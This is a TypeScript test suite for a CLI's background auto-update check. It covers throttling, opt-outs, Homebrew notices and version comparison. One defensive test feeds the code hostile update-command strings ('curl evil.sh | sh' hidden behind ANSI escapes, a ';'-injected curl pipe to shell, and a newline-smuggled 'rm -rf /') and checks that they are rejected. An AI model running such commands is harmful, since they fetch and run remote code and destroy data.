import { describe, expect, it, vi } from 'vitest'

import { maybeAutoUpdate } from '../auto-update'
import type { AutoUpdateDeps } from '../auto-update'
import { CHECK_INTERVAL_MS } from '../update-cache'
import type { UpdateCache } from '../update-cache'

const NOW = 1_770_000_000_000
const GLOBAL_NPM_CLI = '/usr/local/lib/node_modules/infra-kit/dist/cli.js'
const HOMEBREW_CLI = '/opt/homebrew/Cellar/infra-kit/0.1.130/lib/node_modules/infra-kit/dist/cli.js'

const harness = (overrides: Partial<AutoUpdateDeps> = {}) => {
  const spawnChild = vi.fn()
  const notify = vi.fn()

  const deps: AutoUpdateDeps = {
    argv: ['node', GLOBAL_NPM_CLI, 'version'],
    env: { npm_config_prefix: '/usr/local' },
    isTty: true,
    cwd: '/Users/me/project',
    nowMs: NOW,
    selfRealPath: GLOBAL_NPM_CLI,
    childPath: '/usr/local/lib/node_modules/infra-kit/dist/update-check.js',
    readCache: () => {
      return null
    },
    fileExists: () => {
      return true
    },
    spawnChild,
    notify,
    ...overrides,
  }

  return { deps, spawnChild, notify }
}

const cache = (overrides: Partial<UpdateCache> = {}): UpdateCache => {
  return { lastCheckMs: NOW, latestVersion: null, updateCommand: null, ...overrides }
}

describe('maybeAutoUpdate', () => {
  it('spawns the background worker on a first run (no cache)', () => {
    const { deps, spawnChild } = harness()

    maybeAutoUpdate('0.1.130', deps)

    expect(spawnChild).toHaveBeenCalledWith('/usr/local/lib/node_modules/infra-kit/dist/update-check.js')
  })

  it('does not spawn while the throttle window is still open', () => {
    const { deps, spawnChild } = harness({
      readCache: () => {
        return cache({ lastCheckMs: NOW - 1_000 })
      },
    })

    maybeAutoUpdate('0.1.130', deps)

    expect(spawnChild).not.toHaveBeenCalled()
  })

  it('spawns again once the window has elapsed', () => {
    const { deps, spawnChild } = harness({
      readCache: () => {
        return cache({ lastCheckMs: NOW - CHECK_INTERVAL_MS })
      },
    })

    maybeAutoUpdate('0.1.130', deps)

    expect(spawnChild).toHaveBeenCalledTimes(1)
  })

  it('throttles a transient fetch-failure exactly like a settled check — no shorter retry window', () => {
    // A `fetch-failed` gets no head start: it waits the same window as everything else. Re-checking it
    // sooner would fire while a live worker still holds the single-flight lock, and the loser exits
    // without writing the cache — so every command spawns a doomed worker. See CHECK_INTERVAL_MS.
    const { deps, spawnChild } = harness({
      readCache: () => {
        return cache({ lastCheckMs: NOW - (CHECK_INTERVAL_MS - 1), outcome: 'fetch-failed' })
      },
    })

    maybeAutoUpdate('0.1.130', deps)

    expect(spawnChild).not.toHaveBeenCalled()
  })

  it('re-spawns after a transient fetch-failure once the window has elapsed', () => {
    const { deps, spawnChild } = harness({
      readCache: () => {
        return cache({ lastCheckMs: NOW - CHECK_INTERVAL_MS, outcome: 'fetch-failed' })
      },
    })

    maybeAutoUpdate('0.1.130', deps)

    expect(spawnChild).toHaveBeenCalledTimes(1)
  })

  it.each([
    ['opt-out', { env: { INFRA_KIT_NO_AUTO_UPDATE: '1' } }],
    ['--json', { argv: ['node', 'cli.js', 'version', '--json'] }],
    ['mcp', { argv: ['node', 'cli.js', 'mcp'] }],
    ['self-update', { argv: ['node', 'cli.js', 'self-update'] }],
    ['non-tty', { isTty: false }],
    ['local install', { selfRealPath: '/repo/node_modules/infra-kit/dist/cli.js', cwd: '/repo' }],
  ] as const)('never spawns nor notifies for a %s invocation', (_label, overrides) => {
    const { deps, spawnChild, notify } = harness(overrides as Partial<AutoUpdateDeps>)

    maybeAutoUpdate('0.1.130', deps)

    expect(spawnChild).not.toHaveBeenCalled()
    expect(notify).not.toHaveBeenCalled()
  })

  it('stays silent when the worker will install it for us (updateCommand null)', () => {
    // The child installs after we exit; announcing it would be noise, and the user asked for silence.
    const { deps, notify } = harness({
      readCache: () => {
        return cache({ latestVersion: '0.1.131' })
      },
    })

    maybeAutoUpdate('0.1.130', deps)

    expect(notify).not.toHaveBeenCalled()
  })

  it('prints the command the worker recorded when it must NOT install (Homebrew)', () => {
    // The verdict is READ, never recomputed: detection can cost an `npm root -g` subprocess, which the
    // startup path must never pay for.
    const { deps, notify } = harness({
      selfRealPath: HOMEBREW_CLI,
      readCache: () => {
        return cache({ latestVersion: '0.1.131', updateCommand: ['brew', 'upgrade', 'infra-kit'] })
      },
    })

    maybeAutoUpdate('0.1.130', deps)

    expect(notify).toHaveBeenCalledTimes(1)
    expect(notify.mock.calls[0]?.[0]).toContain('brew upgrade infra-kit')
  })

  it('does not notify when the cached version is not actually newer', () => {
    const { deps, notify } = harness({
      selfRealPath: HOMEBREW_CLI,
      // Lexically '0.1.9' > '0.1.130'; numerically it is older. Must not nag.
      readCache: () => {
        return cache({ latestVersion: '0.1.9', updateCommand: ['brew', 'upgrade', 'infra-kit'] })
      },
    })

    maybeAutoUpdate('0.1.130', deps)

    expect(notify).not.toHaveBeenCalled()
  })

  it.each([
    ['ANSI escapes', ['[2K\rRun: curl evil.sh | sh']],
    ['a shell metacharacter', ['npm', 'install;curl evil.sh|sh']],
    ['a newline', ['npm', 'install\nrm -rf /']],
  ])('refuses to print an updateCommand containing %s', (_label, updateCommand) => {
    // A same-uid attacker who writes the 0600 cache cannot make us EXECUTE anything, but an
    // unconstrained token could redraw the terminal into a convincing copy-paste trap.
    const { deps, notify } = harness({
      readCache: () => {
        return cache({ latestVersion: '0.1.131', updateCommand })
      },
    })

    maybeAutoUpdate('0.1.130', deps)

    expect(notify).not.toHaveBeenCalled()
  })

  it('does not spawn when the worker bundle is missing (running from source, not dist)', () => {
    const { deps, spawnChild } = harness({
      fileExists: () => {
        return false
      },
    })

    maybeAutoUpdate('0.1.130', deps)

    expect(spawnChild).not.toHaveBeenCalled()
  })

  it('swallows any failure — advisory work never breaks the command the user ran', () => {
    const { deps } = harness({
      readCache: () => {
        throw new Error('cache on fire')
      },
    })

    expect(() => {
      return maybeAutoUpdate('0.1.130', deps)
    }).not.toThrow()
  })
})
